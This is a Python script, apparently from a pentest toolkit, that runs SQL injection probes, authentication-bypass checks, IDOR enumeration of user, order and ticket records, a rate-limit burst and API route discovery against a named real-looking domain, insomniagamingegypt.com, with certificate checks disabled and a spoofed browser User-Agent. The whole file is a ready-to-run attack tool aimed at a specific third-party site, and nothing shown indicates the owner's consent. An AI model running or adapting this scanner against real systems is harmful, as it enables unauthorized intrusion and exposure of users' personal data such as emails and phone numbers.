#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""Real API Vulnerability Test"""
import requests
import urllib3
import json

urllib3.disable_warnings()

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
    'Content-Type': 'application/json'
})

base = 'https://insomniagamingegypt.com'

print('='*70)
print('REAL API VULNERABILITY TEST')
print('='*70)

# 1. SQL Injection on real API
print('\n[*] SQL Injection Tests (Real API)')
print('-'*50)

sqli_tests = [
    "/api/users?id=1",
    "/api/users?id=1'",
    "/api/users?id=1' OR '1'='1",
    "/api/users?search=test'",
    "/api/events?id=1'",
    "/api/tickets?id=1'",
    "/api/orders?user_id=1'",
    "/api/products?category=1'",
]

for path in sqli_tests:
    try:
        r = s.get(base + path, timeout=10, verify=False)
        # Check for Laravel SQL errors
        laravel_errors = ['sqlstate', 'pdoexception', 'queryexception', 'syntax error', 'mysql', 'database']
        has_sqli = any(e in r.text.lower() for e in laravel_errors)
        
        if has_sqli or r.status_code == 500:
            print(f'\n[!] POTENTIAL SQLi: {path}')
            print(f'    Status: {r.status_code}')
            print(f'    Response: {r.text[:300]}')
        else:
            print(f'    {path:40} | {r.status_code}')
    except Exception as e:
        print(f'    {path:40} | ERROR: {str(e)[:30]}')

# 2. Auth bypass tests
print('\n[*] Authentication Bypass Tests')
print('-'*50)

auth_tests = [
    '/api/users',
    '/api/users/1',
    '/api/users/2',
    '/api/admin',
    '/api/orders',
    '/api/tickets',
    '/api/events',
    '/api/products',
]

for path in auth_tests:
    try:
        r = s.get(base + path, timeout=5, verify=False)
        
        # Check if we get data instead of 401
        if r.status_code == 200:
            try:
                d = r.json()
                if isinstance(d, list):
                    print(f'\n[!] DATA EXPOSURE (List): {path}')
                    print(f'    Count: {len(d)} items')
                    print(f'    Sample: {json.dumps(d[:2])[:150]}')
                elif isinstance(d, dict) and 'data' in d:
                    print(f'\n[!] DATA EXPOSURE (Paginated): {path}')
                    print(f'    Data: {json.dumps(d)[:150]}')
                elif isinstance(d, dict) and 'id' in d:
                    print(f'\n[!] DATA EXPOSURE (Single): {path}')
                    print(f'    Data: {json.dumps(d)[:150]}')
                else:
                    print(f'    {path:40} | 200 | {str(d)[:50]}')
            except json.JSONDecodeError:
                print(f'    {path:40} | 200 | Not JSON')
        elif r.status_code == 401:
            print(f'    {path:40} | 401 Protected')
        elif r.status_code == 404:
            print(f'    {path:40} | 404 Not Found')
        else:
            print(f'    {path:40} | {r.status_code}')
    except Exception as e:
        print(f'    {path:40} | ERROR: {str(e)[:30]}')

# 3. IDOR Tests
print('\n[*] IDOR Tests')
print('-'*50)

idor_paths = [
    '/api/users/1',
    '/api/users/2',
    '/api/users/3',
    '/api/orders/1',
    '/api/orders/2',
    '/api/tickets/1',
    '/api/tickets/2',
    '/api/events/1',
]

for path in idor_paths:
    try:
        r = s.get(base + path, timeout=5, verify=False)
        if r.status_code == 200:
            try:
                d = r.json()
                if isinstance(d, dict) and ('email' in d or 'phone' in d or 'name' in d):
                    print(f'\n[!] IDOR - User Data Exposed: {path}')
                    print(f'    Data: {json.dumps(d)[:150]}')
            except json.JSONDecodeError:
                pass
        print(f'    {path:40} | {r.status_code}')
    except Exception as e:
        print(f'    {path:40} | ERROR: {str(e)[:30]}')

# 4. Rate Limiting
print('\n[*] Rate Limiting Test')
print('-'*50)

responses = []
for i in range(20):
    try:
        r = s.get(base + '/api/users', timeout=5, verify=False)
        responses.append(r.status_code)
    except requests.RequestException:
        responses.append(0)

if 429 in responses:
    print(f'    Rate limiting detected (HTTP 429)')
else:
    print(f'    [!] NO RATE LIMITING')
    print(f'    Responses: {responses}')

# 5. Find all API routes
print('\n[*] API Route Discovery')
print('-'*50)

routes = [
    '/api', '/api/v1', '/api/v2',
    '/api/users', '/api/user', '/api/auth', '/api/events',
    '/api/tickets', '/api/orders', '/api/products', '/api/cart',
    '/api/admin', '/api/admin/users', '/api/admin/events',
    '/api/payment', '/api/webhook', '/api/upload',
    '/api/search', '/api/categories', '/api/tags',
    '/api/settings', '/api/config', '/api/health',
]

found_routes = []
for route in routes:
    try:
        r = s.get(base + route, timeout=3, verify=False)
        ct = r.headers.get('Content-Type', '')
        if 'json' in ct.lower() or r.text.startswith('{'):
            found_routes.append((route, r.status_code))
            print(f'    {route:35} | {r.status_code} [JSON API]')
        elif r.status_code not in [404, 405, 502, 503]:
            print(f'    {route:35} | {r.status_code}')
    except requests.RequestException:
        pass

print('\n' + '='*70)
print('TEST COMPLETE')
print(f'Found {len(found_routes)} active API routes')
print('='*70)
